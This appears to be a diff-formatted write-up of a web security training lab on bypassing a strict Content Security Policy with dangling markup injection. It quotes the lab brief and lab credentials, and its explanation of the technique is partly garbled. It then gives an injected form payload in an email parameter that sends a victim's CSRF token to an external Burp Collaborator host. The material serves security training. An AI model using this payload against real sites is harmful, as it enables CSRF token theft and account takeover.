@@ -1,0 +1,31 @@
+ This lab using a strict CSP that blocks outgoing requests to external web sites.
+
+To solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net.
+
+You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:
+<a href="">Click me</a>
+
+You can log in to your own account using the following credentials: wiener:peter
+
+
+What is dangling markup injection?
+
+Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.   ">   
+
+But it doesn't work anymore
+
+
+Found a path to inject our payload
+
+&email=hello 
+
+"></form><form class="login-form" name="change-email-form" action="https://0det8qp7hi6vbamllut2jpi6axgo4es3.oastify.com/token" method="GET"><button class="button" type="submit"> Click it your Hacked </button>
+
+
+after injecting this code it will show a button called click it your hacked
+
+
+
+
+
+
